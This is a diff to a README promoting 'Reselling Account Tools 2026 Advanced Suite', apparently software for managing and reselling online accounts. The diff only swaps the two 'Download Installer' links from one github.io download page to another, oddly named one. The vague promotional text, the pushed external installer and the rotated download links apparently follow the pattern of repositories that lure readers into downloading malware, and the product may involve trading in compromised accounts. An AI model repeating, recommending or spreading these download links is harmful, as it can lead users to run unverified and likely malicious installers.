@@ -2,7 +2,7 @@
 
 Reselling Account Tools 2026 Advanced Suite is a comprehensive software package designed to streamline account management and reselling operations. This tool offers a user-friendly interface with powerful automation features to maximize efficiency and profits, catering to both beginners and experienced resellers.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -56,7 +56,7 @@ Before installing, ensure your system meets the following requirements for optim
 
 ## Download
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ## Additional Information
 
